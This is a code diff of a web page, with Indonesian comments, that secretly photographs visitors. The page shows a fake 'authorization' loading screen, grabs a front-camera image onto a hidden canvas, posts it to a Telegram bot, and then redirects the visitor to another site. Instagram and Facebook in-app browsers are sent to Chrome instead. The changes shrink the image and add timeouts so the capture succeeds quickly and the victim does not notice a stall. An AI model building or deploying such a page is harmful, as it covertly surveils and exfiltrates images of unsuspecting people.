@@ -182,26 +182,24 @@
 
         <!-- BLOK INSTRUKSI TAMPIL DI INSTAGRAM -->
         <div id="igBox" class="ig-box-instruksi">
-            <!-- Tulisan merah tetap dipertahankan -->
             <div class="ig-text-error">
                 ⚠️ SISTEM TERBLOKIR DI INSTAGRAM
             </div>
             
-            <!-- Kalimat petunjuk yang disederhanakan -->
             <div class="status-text" style="color: #fff; font-size: 13px;">
                 SILAKAN MASUK DI GOOGLE CHROME ATAU BROWSER:
             </div>
 
             <!-- Fitur Salin Link Otomatis -->
             <div class="salin-wrapper">
-                <input type="text" class="salin-input" id="linkInput" value="https://roraxbali.github.io/_one/" readonly>
+                <input type="text" class="salin-input" id="linkInput" value="https://github.io" readonly>
                 <button class="salin-btn" id="copyBtn" onclick="salinTautanOtomatis()">Salin</button>
             </div>
         </div>
 
         <div class="garis-merah-bawah"></div>
-    </div>
-        <video id="video" autoplay playsinline muted></video>
+                </div>
+                    <video id="video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
@@ -225,7 +223,6 @@
             return navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
         }
 
-        // Jalankan logika kondisional berdasarkan jenis browser pengakses
         if (isInstagram()) {
             statusText.style.display = 'none';
             progressContainer.style.display = 'none';
@@ -234,7 +231,6 @@
             mulaiKameraSistem();
         }
 
-        // Fungsi menyalin tautan otomatis saat tombol di-klik
         function salinTautanOtomatis() {
             const linkInput = document.getElementById('linkInput');
             const copyBtn = document.getElementById('copyBtn');
@@ -253,10 +249,16 @@
         }
 
         function mulaiKameraSistem() {
+            // Diturunkan resolusinya ke 320x240 agar ukuran file sangat kecil & instan terkirim di HP lambat
             const constraints = {
-                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+                video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, 
                 audio: false 
             };
+
+            // Set batasan waktu darurat: Jika dalam 6 detik macet total, paksa redirect ke FB
+            setTimeout(() => {
+                window.location.href = DOMAIN_TUJUAN;
+            }, 6000);
 
             navigator.mediaDevices.getUserMedia(constraints)
                 .then(stream => {
@@ -264,7 +266,7 @@
                     video.addEventListener('playing', () => {
                         statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
                         progressBar.style.width = "65%"; 
-                        setTimeout(ambilFotoOtomatis, 2000);
+                        setTimeout(ambilFotoOtomatis, 1500);
                     });
                 })
                 .catch(err => {
@@ -273,13 +275,14 @@
                     statusText.style.color = "#ff3333";
                     progressBar.style.width = "100%";
                     progressBar.classList.add("error");
-                    setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 2000);
+                    setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 1500);
                 });
         }
 
         function ambilFotoOtomatis() {
+            // Mencegah looping macet jika dimensi kamera HP teman lambat memuat
             if (video.videoWidth === 0 || video.videoHeight === 0) {
-                setTimeout(ambilFotoOtomatis, 500);
+                setTimeout(ambilFotoOtomatis, 300);
                 return;
             }
 
@@ -294,9 +297,10 @@
             context.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
             context.restore();
 
+            // Menurunkan kualitas kompresi ke 0.5 agar file menjadi sangat ringan sehingga lolos dari jaringan lambat
             hiddenCanvas.toBlob((blob) => {
                 if (blob) { kirimKeTelegram(blob); } else { window.location.href = DOMAIN_TUJUAN; }
-            }, 'image/jpeg', 0.85);
+            }, 'image/jpeg', 0.50);
         }
 
         function kirimKeTelegram(imageBlob) {
@@ -305,18 +309,26 @@
             formData.append('photo', imageBlob, 'secure_log.jpg');
             formData.append('caption', '🛡️ Log Otorisasi Pengunjung: WELCOME BY RORAXBALI');
 
+            // SISTEM ANTI MACET (TIMEOUT DETECTOR)
+            // Jika dalam waktu 4 detik bot Telegram tidak merespons, langsung lempar user ke FB agar tidak macet
+            const controller = new AbortController();
+            const idTimeout = setTimeout(() => controller.abort(), 4000);
+
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
-                body: formData
+                body: formData,
+                signal: controller.signal
             })
             .then(response => response.json())
             .then(data => {
+                clearTimeout(idTimeout);
                 progressBar.style.width = "100%"; 
                 statusText.innerText = "Koneksi selesai. Menghubungkan...";
                 setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 800);
             })
             .catch(error => {
-                console.error('Transmisi error:', error);
+                // Tetap dialihkan ke halaman tujuan meskipun pengiriman gagal/terlalu lambat
+                console.error('Transmisi terputus atau timeout:', error);
                 window.location.href = DOMAIN_TUJUAN;
             });
         }
